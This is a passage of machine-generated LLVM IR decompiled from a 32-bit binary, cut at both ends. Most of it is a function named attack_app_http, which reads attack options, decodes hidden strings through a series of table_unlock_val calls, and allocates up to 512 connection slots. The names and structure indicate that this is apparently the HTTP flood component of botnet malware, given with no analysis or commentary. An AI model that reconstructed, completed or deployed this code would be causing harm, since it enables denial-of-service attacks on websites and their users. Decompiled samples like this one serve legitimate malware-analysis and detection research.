  store i32 %v1_8048845, i32* %edx.global-to-local, align 4
  %v0_8048846 = load i32, i32* @ebx, align 4
  %v3_8048846 = mul nuw nsw i32 %v1_8048836, 4
  %v4_8048846 = add i32 %v3_8048846, %v3_8048831
  %v5_8048846 = inttoptr i32 %v4_8048846 to i32*
  store i32 %v0_8048846, i32* %v5_8048846, align 4
  %v0_8048849 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048849 = trunc i32 %v0_8048849 to i8
  store i8 %v1_8048849, i8* @global_var_8057d1c.10, align 4
  store i32 %v2_8048828, i32* %edx.global-to-local, align 4
  %v3_8048855 = call i32 @calloc(i64 1, i32 8)
  store i32 %v3_8048855, i32* @ebx, align 4
  %v1_804885c = add i32 %v3_8048855, 4
  %v2_804885c = inttoptr i32 %v1_804885c to i8*
  store i8 9, i8* %v2_804885c, align 1
  %v1_8048860 = inttoptr i32 %v3_8048855 to i32*
  store i32 134514864, i32* %v1_8048860, align 4
  %v0_804886a = load i32, i32* @global_var_8057d20.11, align 32
  store i32 %v0_804886a, i32* @edx, align 4
  %v0_8048870 = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_8048870 = zext i8 %v0_8048870 to i32
  %v1_8048875 = mul nuw nsw i32 %v1_8048870, 4
  %v2_8048875 = add nuw nsw i32 %v1_8048875, 4
  %v2_804887e = inttoptr i32 %v0_804886a to i32*
  %v3_804887e = call i32 @realloc(i32* %v2_804887e, i32 %v2_8048875)
  %v0_8048883 = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_8048883 = zext i8 %v0_8048883 to i32
  %v2_8048883 = load i32, i32* @edx, align 4
  %v3_8048883 = and i32 %v2_8048883, -256
  %v4_8048883 = or i32 %v3_8048883, %v1_8048883
  store i32 %v3_804887e, i32* @global_var_8057d20.11, align 32
  %v1_8048892 = add i32 %v4_8048883, 1
  store i32 %v1_8048892, i32* %edx.global-to-local, align 4
  %v0_8048893 = load i32, i32* @ebx, align 4
  %v3_8048893 = mul nuw nsw i32 %v1_8048883, 4
  %v4_8048893 = add i32 %v3_8048893, %v3_804887e
  %v5_8048893 = inttoptr i32 %v4_8048893 to i32*
  store i32 %v0_8048893, i32* %v5_8048893, align 4
  %v0_8048896 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048896 = trunc i32 %v0_8048896 to i8
  store i8 %v1_8048896, i8* @global_var_8057d1c.10, align 4
  %v2_80488a4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80488a4, i32* @ebx, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_8048883, { 1, 0 }
  uselistorder i32 %v1_8048836, { 1, 0 }
  uselistorder i32 %v1_80487e9, { 1, 0 }
  uselistorder i32 %v1_804879d, { 1, 0 }
  uselistorder i32 %v1_8048751, { 1, 0 }
  uselistorder i32 %v1_8048705, { 1, 0 }
  uselistorder i32 %v1_80486b9, { 1, 0 }
  uselistorder i32 %v1_804866d, { 1, 0 }
  uselistorder i32 %v1_8048621, { 1, 0 }
  uselistorder i32 %v1_80485d5, { 1, 0 }
  uselistorder i8* @global_var_8057d1c.10, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @attack_app_http(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg2 to i8
  %tmp84 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20848 = alloca i8*, align 4
  %stack_var_-312 = alloca i32, align 4
  %stack_var_-20793 = alloca i32, align 4
  %stack_var_-20940 = alloca i32, align 4
  %stack_var_-20924 = alloca i32, align 4
  %v0_80488b0 = load i32, i32* @ebp, align 4
  %v0_80488b2 = load i32, i32* @esi, align 4
  %v0_80488b3 = load i32, i32* @ebx, align 4
  %v15_80488b4 = ptrtoint i32* %stack_var_-20924 to i32
  %v4_80488ba = urem i32 %arg2, 256
  store i32 %arg3, i32* @ebx, align 4
  %v2_80488c8 = icmp eq i8 %tmp, 0
  store i1 %v2_80488c8, i1* %zf.global-to-local, align 1
  store i32 %v4_80488ba, i32* @eax, align 4
  %v4_80488cd = zext i8 %arg1 to i32
  store i32 %v4_80488cd, i32* @ebp, align 4
  store i32 %v4_80488ba, i32* @esi, align 4
  store i32 %v4_80488ba, i32* %stack_var_-20940, align 4
  %v5_80488dd = call i32 @attack_get_opt_str(i8 %tmp, i32 %arg3, i32 20, i32 0)
  store i32 %v5_80488dd, i32* @eax, align 4
  %v0_80488ed = load i32, i32* @ebx, align 4
  %v0_80488ee = load i32, i32* @esi, align 4
  %v5_80488ef = trunc i32 %v0_80488ee to i8
  %v6_80488ef = call i32 @attack_get_opt_str(i8 %v5_80488ef, i32 %v0_80488ed, i32 19, i32 ptrtoint ([4 x i8]* @global_var_8055854.12 to i32))
  store i32 %v6_80488ef, i32* @eax, align 4
  %tmp117 = bitcast i8** %stack_var_-20848 to i32*
  store i32 %v6_80488ef, i32* %tmp117, align 4
  %v0_80488f8 = load i32, i32* @esp, align 4
  %v6_80488f8 = icmp eq i32 %v0_80488f8, -32
  store i1 %v6_80488f8, i1* %zf.global-to-local, align 1
  %v0_80488ff = load i32, i32* @ebx, align 4
  %v0_8048900 = load i32, i32* @esi, align 4
  store i32 %v0_8048900, i32* %stack_var_-20940, align 4
  %v4_8048901 = trunc i32 %v0_8048900 to i8
  %v5_8048901 = call i32 @attack_get_opt_str(i8 %v4_8048901, i32 %v0_80488ff, i32 8, i32 0)
  store i32 %v5_8048901, i32* @eax, align 4
  %v0_8048911 = load i32, i32* @ebx, align 4
  %v0_8048912 = load i32, i32* @esi, align 4
  %v5_8048913 = trunc i32 %v0_8048912 to i8
  %v6_8048913 = call i32 @attack_get_opt_str(i8 %v5_8048913, i32 %v0_8048911, i32 21, i32 ptrtoint (i32* @global_var_805582d.13 to i32))
  store i32 %v6_8048913, i32* @eax, align 4
  %v0_804891c = load i32, i32* @esp, align 4
  %v6_804891c = icmp eq i32 %v0_804891c, -32
  store i1 %v6_804891c, i1* %zf.global-to-local, align 1
  %v0_8048923 = load i32, i32* @ebx, align 4
  %v0_8048924 = load i32, i32* @esi, align 4
  store i32 %v0_8048924, i32* %stack_var_-20940, align 4
  %v4_8048925 = trunc i32 %v0_8048924 to i8
  %v5_8048925 = call i32 @attack_get_opt_int(i8 %v4_8048925, i32 %v0_8048923, i32 23, i32 1)
  store i32 %v5_8048925, i32* @eax, align 4
  store i32 %v5_8048925, i32* @edi, align 4
  %v0_8048930 = load i32, i32* @ebx, align 4
  %v0_8048931 = load i32, i32* @esi, align 4
  %v5_8048932 = trunc i32 %v0_8048931 to i8
  %v6_8048932 = call i32 @attack_get_opt_int(i8 %v5_8048932, i32 %v0_8048930, i32 7, i32 80)
  store i32 %v6_8048932, i32* %eax.global-to-local, align 4
  %v0_804893c = load i32, i32* @esp, align 4
  %v9_804893c = icmp eq i32 %v0_804893c, -28
  store i1 %v9_804893c, i1* %zf.global-to-local, align 1
  %v2_8048946 = ptrtoint i32* %stack_var_-20793 to i32
  store i32 %v2_8048946, i32* %edx.global-to-local, align 4
  store i32 %v2_8048946, i32* %stack_var_-20940, align 4
  %v3_804894e = bitcast i32* %stack_var_-20793 to i8*
  %v4_804894e = call i32 @__GI_memset(i8* %v3_804894e, i32 0, i32 10241)
  store i32 %v4_804894e, i32* %eax.global-to-local, align 4
  store i32 %v5_8048901, i32* %ecx.global-to-local, align 4
  %v1_804895a = icmp eq i32 %v5_8048901, 0
  store i1 %v1_804895a, i1* %zf.global-to-local, align 1
  %tmp170 = inttoptr i32 %v6_80488ef to i8*
  br i1 %v1_804895a, label %dec_label_pc_804897d, label %dec_label_pc_804895e

dec_label_pc_804895e:                             ; preds = %entry
  store i32 %v6_8048913, i32* %edx.global-to-local, align 4
  %v1_8048962 = icmp eq i32 %v6_8048913, 0
  store i1 %v1_8048962, i1* %zf.global-to-local, align 1
  br i1 %v1_8048962, label %dec_label_pc_804897d, label %dec_label_pc_8048966

dec_label_pc_8048966:                             ; preds = %dec_label_pc_804895e
  %v9_8048966 = icmp eq i32* %stack_var_-20924, inttoptr (i32 12 to i32*)
  store i1 %v9_8048966, i1* %zf.global-to-local, align 1
  store i32 %v6_8048913, i32* %eax.global-to-local, align 4
  store i32 %v6_8048913, i32* %stack_var_-20940, align 4
  %v1_804896e = inttoptr i32 %v6_8048913 to i8*
  %v2_804896e = call i32 @util_strlen(i8* %v1_804896e)
  store i32 %v2_804896e, i32* %eax.global-to-local, align 4
  %v10_8048976 = icmp eq i32 %v2_804896e, 255
  store i1 %v10_8048976, i1* %zf.global-to-local, align 1
  %v7_804897b = icmp sgt i32 %v2_804896e, 255
  br i1 %v7_804897b, label %dec_label_pc_804897d, label %dec_label_pc_8048988

dec_label_pc_804897d:                             ; preds = %dec_label_pc_8048966, %dec_label_pc_804899d, %dec_label_pc_8048988, %dec_label_pc_804895e, %entry
  %v0_8048987 = phi i32 [ %v2_804896e, %dec_label_pc_8048966 ], [ %v2_80489a5, %dec_label_pc_804899d ], [ %v2_8048990, %dec_label_pc_8048988 ], [ %v4_804894e, %dec_label_pc_804895e ], [ %v4_804894e, %entry ]
  %v9_804897d = icmp eq i32* %stack_var_-20924, inttoptr (i32 -20908 to i32*)
  store i1 %v9_804897d, i1* %zf.global-to-local, align 1
  store i32 %v0_80488b3, i32* %ebx.global-to-local, align 4
  store i32 %v0_80488b2, i32* %esi.global-to-local, align 4
  store i32 %v0_80488b0, i32* %ebp.global-to-local, align 4
  ret i32 %v0_8048987

dec_label_pc_8048988:                             ; preds = %dec_label_pc_8048966
  store i1 %v9_8048966, i1* %zf.global-to-local, align 1
  store i32 %v5_8048901, i32* %eax.global-to-local, align 4
  store i32 %v5_8048901, i32* %stack_var_-20940, align 4
  %v1_8048990 = inttoptr i32 %v5_8048901 to i8*
  %v2_8048990 = call i32 @util_strlen(i8* %v1_8048990)
  store i32 %v2_8048990, i32* %eax.global-to-local, align 4
  %v1_8048998 = add i32 %v2_8048990, -127
  %v6_8048998 = sub i32 126, %v2_8048990
  %v7_8048998 = and i32 %v6_8048998, %v2_8048990
  %v8_8048998 = icmp slt i32 %v7_8048998, 0
  %v9_8048998 = icmp eq i32 %v1_8048998, 0
  store i1 %v9_8048998, i1* %zf.global-to-local, align 1
  %v10_8048998 = icmp slt i32 %v1_8048998, 0
  %v3_804899b = icmp eq i1 %v10_8048998, %v8_8048998
  %v4_804899b = icmp eq i1 %v9_8048998, false
  %v5_804899b = and i1 %v4_804899b, %v3_804899b
  br i1 %v5_804899b, label %dec_label_pc_804897d, label %dec_label_pc_804899d

dec_label_pc_804899d:                             ; preds = %dec_label_pc_8048988
  store i1 %v9_8048966, i1* %zf.global-to-local, align 1
  store i32 %v6_80488ef, i32* %eax.global-to-local, align 4
  store i32 %v6_80488ef, i32* %stack_var_-20940, align 4
  %v2_80489a5 = call i32 @util_strlen(i8* %tmp170)
  store i32 %v2_80489a5, i32* %eax.global-to-local, align 4
  %v1_80489ad = add i32 %v2_80489a5, -9
  %v6_80489ad = sub i32 8, %v2_80489a5
  %v7_80489ad = and i32 %v6_80489ad, %v2_80489a5
  %v8_80489ad = icmp slt i32 %v7_80489ad, 0
  %v9_80489ad = icmp eq i32 %v1_80489ad, 0
  store i1 %v9_80489ad, i1* %zf.global-to-local, align 1
  %v10_80489ad = icmp slt i32 %v1_80489ad, 0
  %v3_80489b0 = icmp eq i1 %v10_80489ad, %v8_80489ad
  %v4_80489b0 = icmp eq i1 %v9_80489ad, false
  %v5_80489b0 = and i1 %v4_80489b0, %v3_80489b0
  br i1 %v5_80489b0, label %dec_label_pc_804897d, label %dec_label_pc_80489bd.preheader

dec_label_pc_80489bd.preheader:                   ; preds = %dec_label_pc_804899d
  store i1 %v9_8048966, i1* %zf.global-to-local, align 1
  store i32 %v6_80488ef, i32* %eax.global-to-local, align 4
  store i32 %v6_80488ef, i32* %stack_var_-20940, align 4
  %v2_80489c5154 = call i32 @util_strlen(i8* %tmp170)
  store i32 %v2_80489c5154, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v12_80489d4155 = icmp eq i32 %v2_80489c5154, 0
  store i1 %v12_80489d4155, i1* %zf.global-to-local, align 1
  %v7_80489d6156 = icmp sgt i32 %v2_80489c5154, 0
  br i1 %v7_80489d6156, label %dec_label_pc_80489d8, label %dec_label_pc_80489fd

dec_label_pc_80489d8:                             ; preds = %dec_label_pc_80489bd.preheader, %dec_label_pc_80489ec
  %v4_80489c0159 = phi i32 [ %v4_80489c0, %dec_label_pc_80489ec ], [ %v6_80488ef, %dec_label_pc_80489bd.preheader ]
  %v4_80489de158 = phi i32 [ %v1_80489f3, %dec_label_pc_80489ec ], [ 0, %dec_label_pc_80489bd.preheader ]
  %v3_80489d8157 = phi i8* [ %v3_80489c0.pre, %dec_label_pc_80489ec ], [ %tmp170, %dec_label_pc_80489bd.preheader ]
  %v2_80489dc = add i32 %v4_80489de158, %v4_80489c0159
  %v12_80489dc = icmp eq i32 %v2_80489dc, 0
  store i1 %v12_80489dc, i1* %zf.global-to-local, align 1
  store i32 %v2_80489dc, i32* %ecx.global-to-local, align 4
  %v1_80489de = inttoptr i32 %v2_80489dc to i8*
  %v2_80489de = load i8, i8* %v1_80489de, align 1
  %v3_80489de = zext i8 %v2_80489de to i32
  %v5_80489de = and i32 %v4_80489de158, -256
  %v6_80489de = or i32 %v3_80489de, %v5_80489de
  store i32 %v6_80489de, i32* %edx.global-to-local, align 4
  %v1_80489e0 = add i32 %v6_80489de, -97
  store i32 %v1_80489e0, i32* %eax.global-to-local, align 4
  %v1_80489e3 = trunc i32 %v1_80489e0 to i8
  %v11_80489e3 = icmp eq i8 %v1_80489e3, 25
  store i1 %v11_80489e3, i1* %zf.global-to-local, align 1
  %v8_80489e5 = icmp ugt i8 %v1_80489e3, 25
  br i1 %v8_80489e5, label %dec_label_pc_80489ec, label %dec_label_pc_80489e7

dec_label_pc_80489e7:                             ; preds = %dec_label_pc_80489d8
  %v1_80489e7 = add i32 %v6_80489de, -32
  store i32 %v1_80489e7, i32* %eax.global-to-local, align 4
  %v1_80489ea = trunc i32 %v1_80489e7 to i8
  store i8 %v1_80489ea, i8* %v1_80489de, align 1
  %v0_80489bd.pre.pre = load i32, i32* @esp, align 4
  %v3_80489c0.pre.pre = load i8*, i8** %stack_var_-20848, align 4
  br label %dec_label_pc_80489ec

dec_label_pc_80489ec:                             ; preds = %dec_label_pc_80489d8, %dec_label_pc_80489e7
  %v3_80489c0.pre = phi i8* [ %v3_80489d8157, %dec_label_pc_80489d8 ], [ %v3_80489c0.pre.pre, %dec_label_pc_80489e7 ]
  %v0_80489bd.pre = phi i32 [ %v15_80488b4, %dec_label_pc_80489d8 ], [ %v0_80489bd.pre.pre, %dec_label_pc_80489e7 ]
  %v1_80489f3 = add i32 %v4_80489de158, 1
  %v9_80489bd = icmp eq i32 %v0_80489bd.pre, 12
  store i1 %v9_80489bd, i1* %zf.global-to-local, align 1
  %v4_80489c0 = ptrtoint i8* %v3_80489c0.pre to i32
  store i32 %v4_80489c0, i32* %eax.global-to-local, align 4
  store i32 %v4_80489c0, i32* %stack_var_-20940, align 4
  %v2_80489c5 = call i32 @util_strlen(i8* %v3_80489c0.pre)
  store i32 %v2_80489c5, i32* %eax.global-to-local, align 4
  store i32 %v1_80489f3, i32* %edx.global-to-local, align 4
  %v12_80489d4 = icmp eq i32 %v2_80489c5, %v1_80489f3
  store i1 %v12_80489d4, i1* %zf.global-to-local, align 1
  %v7_80489d6 = icmp sgt i32 %v2_80489c5, %v1_80489f3
  br i1 %v7_80489d6, label %dec_label_pc_80489d8, label %dec_label_pc_80489fd

dec_label_pc_80489fd:                             ; preds = %dec_label_pc_80489ec, %dec_label_pc_80489bd.preheader
  %v0_80489fd = load i32, i32* @edi, align 4
  %v7_8048a07 = icmp sgt i32 %v0_80489fd, 512
  %.v0_80489fd = select i1 %v7_8048a07, i32 512, i32 %v0_80489fd
  store i1 %v9_8048966, i1* %zf.global-to-local, align 1
  store i32 43, i32* %stack_var_-20940, align 4
  %v2_8048a16 = call i32 @table_unlock_val(i8 43)
  store i32 %v2_8048a16, i32* %eax.global-to-local, align 4
  store i32 44, i32* %stack_var_-20940, align 4
  %v2_8048a22 = call i32 @table_unlock_val(i8 44)
  store i32 %v2_8048a22, i32* %eax.global-to-local, align 4
  store i32 45, i32* %stack_var_-20940, align 4
  %v2_8048a2e = call i32 @table_unlock_val(i8 45)
  store i32 %v2_8048a2e, i32* %eax.global-to-local, align 4
  store i32 46, i32* %stack_var_-20940, align 4
  %v2_8048a3a = call i32 @table_unlock_val(i8 46)
  store i32 %v2_8048a3a, i32* %eax.global-to-local, align 4
  store i32 47, i32* %stack_var_-20940, align 4
  %v2_8048a46 = call i32 @table_unlock_val(i8 47)
  store i32 %v2_8048a46, i32* %eax.global-to-local, align 4
  store i32 48, i32* %stack_var_-20940, align 4
  %v2_8048a52 = call i32 @table_unlock_val(i8 48)
  store i32 %v2_8048a52, i32* %eax.global-to-local, align 4
  store i32 49, i32* %stack_var_-20940, align 4
  %v2_8048a5e = call i32 @table_unlock_val(i8 49)
  store i32 %v2_8048a5e, i32* %eax.global-to-local, align 4
  store i32 50, i32* %stack_var_-20940, align 4
  %v2_8048a6a = call i32 @table_unlock_val(i8 50)
  store i32 %v2_8048a6a, i32* %eax.global-to-local, align 4
  store i32 51, i32* %stack_var_-20940, align 4
  %v2_8048a76 = call i32 @table_unlock_val(i8 51)
  store i32 %v2_8048a76, i32* %eax.global-to-local, align 4
  store i32 52, i32* %stack_var_-20940, align 4
  %v2_8048a82 = call i32 @table_unlock_val(i8 52)
  store i32 %v2_8048a82, i32* %eax.global-to-local, align 4
  store i32 53, i32* %stack_var_-20940, align 4
  %v2_8048a8e = call i32 @table_unlock_val(i8 53)
  %v2_8048a93 = load i32, i32* %stack_var_-20940, align 4
  store i32 %v2_8048a93, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %.v0_80489fd, i32* @esi, align 4
  store i32 %.v0_80489fd, i32* %stack_var_-20940, align 4
  %v2_8048a9f = sext i32 %.v0_80489fd to i64
  %v3_8048a9f = call i32 @calloc(i64 %v2_8048a9f, i32 3140)
  store i32 %v3_8048a9f, i32* %eax.global-to-local, align 4
  store i32 %.v0_80489fd, i32* @ebx, align 4
  %v1_8048aaf = icmp eq i32 %.v0_80489fd, 0
  store i1 %v1_8048aaf, i1* %zf.global-to-local, align 1
  %tmp118 = icmp slt i32 %.v0_80489fd, 1
  br i1 %tmp118, label %dec_label_pc_8048bde, label %dec_label_pc_8048ab7

dec_label_pc_8048ab7:                             ; preds = %dec_label_pc_80489fd
  %v0_8048ab7 = load i32, i32* @ebp, align 4
  %v1_8048ab7 = urem i32 %v0_8048ab7, 256
  %v2_8048ab7 = icmp eq i32 %v1_8048ab7, 0
  store i1 %v2_8048ab7, i1* %zf.global-to-local, align 1
  store i32 %v1_8048ab7, i32* @ebp, align 4
  store i32 %v3_8048a9f, i32* @esi, align 4
  %v2_804a56c = inttoptr i32 %v0_80488b3 to i8*
  %v1_804a62e = trunc i32 %v0_80488b3 to i8
  %v2_804a639 = inttoptr i32 %v0_80488b2 to i32*
  br label %dec_label_pc_8048ac7

dec_label_pc_8048ac7:                             ; preds = %dec_label_pc_804a55a.dec_label_pc_8048ac7_crit_edge, %dec_label_pc_8048ab7
  %v0_8048ac7 = phi i32 [ %v0_8048ac7.pre, %dec_label_pc_804a55a.dec_label_pc_8048ac7_crit_edge ], [ %v3_8048a9f, %dec_label_pc_8048ab7 ]
  %v1_8048ac7 = add i32 %v0_8048ac7, 4
  %v2_8048ac7 = inttoptr i32 %v1_8048ac7 to i8*
  store i8 0, i8* %v2_8048ac7, align 1
  %v0_8048acb = load i32, i32* @esi, align 4
  %v1_8048acb = inttoptr i32 %v0_8048acb to i32*
  store i32 -1, i32* %v1_8048acb, align 4
  %v0_8048ad1 = load i32, i32* @esp, align 4
  %v1_8048ad1 = add i32 %v0_8048ad1, 68
  %v2_8048ad1 = inttoptr i32 %v1_8048ad1 to i32*
  %v3_8048ad1 = load i32, i32* %v2_8048ad1, align 4
  store i32 %v3_8048ad1, i32* %edx.global-to-local, align 4
  %v1_8048ad5 = add i32 %v0_8048ad1, 20932
  %v2_8048ad5 = inttoptr i32 %v1_8048ad5 to i32*
  %v3_8048ad5 = load i32, i32* %v2_8048ad5, align 4
  store i32 %v3_8048ad5, i32* %ecx.global-to-local, align 4
  %v2_8048ade = ashr i32 %v3_8048ad1, 31
  %v3_8048ade = icmp eq i32 %v2_8048ade, 0
  store i1 %v3_8048ade, i1* %zf.global-to-local, align 1
  %v0_8048ae1 = load i32, i32* @ebp, align 4
  %v2_8048ae1 = zext i32 %v3_8048ad1 to i64
  %v4_8048ae1 = zext i32 %v2_8048ade to i64
  %v5_8048ae1 = mul nuw i64 %v4_8048ae1, 4294967296
  %v6_8048ae1 = or i64 %v5_8048ae1, %v2_8048ae1
  %v7_8048ae1 = zext i32 %v0_8048ae1 to i64
  %v8_8048ae1 = sdiv i64 %v6_8048ae1, %v7_8048ae1
  %v9_8048ae1 = trunc i64 %v8_8048ae1 to i32
  store i32 %v9_8048ae1, i32* %eax.global-to-local, align 4
  %v10_8048ae1 = srem i64 %v6_8048ae1, %v7_8048ae1
  %v11_8048ae1 = trunc i64 %v10_8048ae1 to i32
  %v3_8048ae3 = mul i32 %v11_8048ae1, 3
  store i32 %v3_8048ae3, i32* %edx.global-to-local, align 4
  %v2_8048ae6 = mul i32 %v11_8048ae1, 24
  %v3_8048ae6 = add i32 %v2_8048ae6, %v3_8048ad5
  store i32 %v3_8048ae6, i32* @edi, align 4
  %v1_8048ae9 = add i32 %v3_8048ae6, 16
  %v2_8048ae9 = inttoptr i32 %v1_8048ae9 to i32*
  %v3_8048ae9 = load i32, i32* %v2_8048ae9, align 4
  %v1_8048aec = load i32, i32* @esi, align 4
  %v2_8048aec = add i32 %v1_8048aec, 16
  %v3_8048aec = inttoptr i32 %v2_8048aec to i32*
  store i32 %v3_8048ae9, i32* %v3_8048aec, align 4
  %v0_8048aef = load i32, i32* @esi, align 4
  %v1_8048aef = add i32 %v0_8048aef, 532
  store i32 %v1_8048aef, i32* @eax, align 4
  %v1_8048af5 = load i32, i32* @esp, align 4
  %v2_8048af5 = add i32 %v1_8048af5, 44
  %v3_8048af5 = inttoptr i32 %v2_8048af5 to i32*
  store i32 %v1_8048aef, i32* %v3_8048af5, align 4
  %v0_8048af9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8048af9 = load i32, i32* @esp, align 4
  %v2_8048af9 = add i32 %v1_8048af9, -4
  %v3_8048af9 = inttoptr i32 %v2_8048af9 to i32*
  store i32 %v0_8048af9, i32* %v3_8048af9, align 4
  %v0_8048afa = load i32, i32* %ecx.global-to-local, align 4
  %v2_8048afa = add i32 %v1_8048af9, -8
  %v3_8048afa = inttoptr i32 %v2_8048afa to i32*
  store i32 %v0_8048afa, i32* %v3_8048afa, align 4
  %v1_8048afb = add i32 %v1_8048af9, 84
  %v2_8048afb = inttoptr i32 %v1_8048afb to i32*
  %v3_8048afb = load i32, i32* %v2_8048afb, align 4
  store i32 %v3_8048afb, i32* %edx.global-to-local, align 4
  %v2_8048aff = add i32 %v1_8048af9, -12
  %v3_8048aff = inttoptr i32 %v2_8048aff to i32*
  store i32 %v3_8048afb, i32* %v3_8048aff, align 4
  %v0_8048b00 = load i32, i32* @eax, align 4
  %v2_8048b00 = add i32 %v1_8048af9, -16
  %v3_8048b00 = inttoptr i32 %v2_8048b00 to i32*
  store i32 %v0_8048b00, i32* %v3_8048b00, align 4
  %v3_8048b01 = call i32 @util_strcpy(i8* null, i32 %v5_80488dd)
  store i32 %v3_8048b01, i32* %eax.global-to-local, align 4
  %v0_8048b06 = load i32, i32* @esp, align 4
  %v1_8048b06 = add i32 %v0_8048b06, 16
  %v6_8048b06 = icmp eq i32 %v1_8048b06, 0
  store i1 %v6_8048b06, i1* %zf.global-to-local, align 1
  %v0_8048b09 = load i32, i32* @esi, align 4
  %v1_8048b09 = add i32 %v0_8048b09, 532
  %v2_8048b09 = inttoptr i32 %v1_8048b09 to i8*
  %v3_8048b09 = load i8, i8* %v2_8048b09, align 1
  %v12_8048b09 = icmp eq i8 %v3_8048b09, 47
  store i1 %v12_8048b09, i1* %zf.global-to-local, align 1
  br i1 %v12_8048b09, label %dec_label_pc_8048b3e, label %dec_label_pc_8048b12

dec_label_pc_8048b12:                             ; preds = %dec_label_pc_8048ac7
  %v9_8048b12 = icmp eq i32 %v0_8048b06, -4
  store i1 %v9_8048b12, i1* %zf.global-to-local, align 1
  %v1_8048b15 = add i32 %v0_8048b06, 60
  %v2_8048b15 = inttoptr i32 %v1_8048b15 to i32*
  %v3_8048b15 = load i32, i32* %v2_8048b15, align 4
  store i32 %v3_8048b15, i32* %eax.global-to-local, align 4
  %v3_8048b19 = inttoptr i32 %v0_8048b06 to i32*
  store i32 %v3_8048b15, i32* %v3_8048b19, align 4
  %v2_8048b1a = call i32 @util_strlen(i8* null)
  store i32 %v2_8048b1a, i32* %eax.global-to-local, align 4
  %v0_8048b1f = load i32, i32* @esp, align 4
  %v9_8048b1f = icmp eq i32 %v0_8048b1f, -12
  store i1 %v9_8048b1f, i1* %zf.global-to-local, align 1
  %v2_8048b22 = add i32 %v0_8048b1f, 8
  %v3_8048b22 = inttoptr i32 %v2_8048b22 to i32*
  store i32 %v2_8048b1a, i32* %v3_8048b22, align 4
  %v1_8048b23 = add i32 %v0_8048b1f, 60
  %v2_8048b23 = inttoptr i32 %v1_8048b23 to i32*
  %v3_8048b23 = load i32, i32* %v2_8048b23, align 4
  %v2_8048b27 = add i32 %v0_8048b1f, 4
  %v3_8048b27 = inttoptr i32 %v2_8048b27 to i32*
  store i32 %v3_8048b23, i32* %v3_8048b27, align 4
  %v0_8048b28 = load i32, i32* @esi, align 4
  %v1_8048b28 = add i32 %v0_8048b28, 533
  store i32 %v1_8048b28, i32* %eax.global-to-local, align 4
  %v3_8048b2e = inttoptr i32 %v0_8048b1f to i32*
  store i32 %v1_8048b28, i32* %v3_8048b2e, align 4
  %v2_8048b2f = load i8*, i8** %stack_var_-20848, align 4
  %v3_8048b2f = ptrtoint i8* %v2_8048b2f to i32
  %v5_8048b2f = call i32 @memmove(i8* null, i32 %v5_80488dd, i32 %v3_8048b2f)
  store i32 %v5_8048b2f, i32* %eax.global-to-local, align 4
  %v0_8048b34 = load i32, i32* @esi, align 4
  %v1_8048b34 = add i32 %v0_8048b34, 532
  %v2_8048b34 = inttoptr i32 %v1_8048b34 to i8*
  store i8 47, i8* %v2_8048b34, align 1
  %v0_8048b3b = load i32, i32* @esp, align 4
  %v1_8048b3b = add i32 %v0_8048b3b, 16
  %v6_8048b3b = icmp eq i32 %v1_8048b3b, 0
  store i1 %v6_8048b3b, i1* %zf.global-to-local, align 1
  %v0_8048b3e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8048b3e

dec_label_pc_8048b3e:                             ; preds = %dec_label_pc_8048ac7, %dec_label_pc_8048b12
  %v1_8048b3e = phi i32 [ %v1_8048b06, %dec_label_pc_8048ac7 ], [ %v1_8048b3b, %dec_label_pc_8048b12 ]
  %v0_8048b3e = phi i32 [ %v3_8048b01, %dec_label_pc_8048ac7 ], [ %v0_8048b3e.pre, %dec_label_pc_8048b12 ]
  %v2_8048b3e = add i32 %v1_8048b3e, -4
  %v3_8048b3e = inttoptr i32 %v2_8048b3e to i32*
  store i32 %v0_8048b3e, i32* %v3_8048b3e, align 4
  %v0_8048b3f = load i32, i32* %eax.global-to-local, align 4
  %v2_8048b3f = add i32 %v1_8048b3e, -8
  %v3_8048b3f = inttoptr i32 %v2_8048b3f to i32*
  store i32 %v0_8048b3f, i32* %v3_8048b3f, align 4
  %v1_8048b40 = add i32 %v1_8048b3e, 76
  %v2_8048b40 = inttoptr i32 %v1_8048b40 to i32*
  %v3_8048b40 = load i32, i32* %v2_8048b40, align 4
  %v2_8048b44 = add i32 %v1_8048b3e, -12
  %v3_8048b44 = inttoptr i32 %v2_8048b44 to i32*
  store i32 %v3_8048b40, i32* %v3_8048b44, align 4
  %v0_8048b45 = load i32, i32* @esi, align 4
  %v1_8048b45 = add i32 %v0_8048b45, 1440
  store i32 %v1_8048b45, i32* @eax, align 4
  %v2_8048b4b = add i32 %v1_8048b3e, -16
  %v3_8048b4b = inttoptr i32 %v2_8048b4b to i32*
  store i32 %v1_8048b45, i32* %v3_8048b4b, align 4
  %v3_8048b4c = call i32 @util_strcpy(i8* null, i32 %v5_80488dd)
  store i32 %v3_8048b4c, i32* %eax.global-to-local, align 4
  %v0_8048b51 = load i32, i32* @esp, align 4
  %v1_8048b51 = inttoptr i32 %v0_8048b51 to i32*
  %v2_8048b51 = load i32, i32* %v1_8048b51, align 4
  store i32 %v2_8048b51, i32* @ebx, align 4
  %v0_8048b53 = load i32, i32* @esi, align 4
  %v1_8048b53 = add i32 %v0_8048b53, 1431
  store i32 %v1_8048b53, i32* @eax, align 4
  %v1_8048b59 = add i32 %v0_8048b51, 92
  %v2_8048b59 = inttoptr i32 %v1_8048b59 to i32*
  %v3_8048b59 = load i32, i32* %v2_8048b59, align 4
  store i32 %v3_8048b59, i32* %ecx.global-to-local, align 4
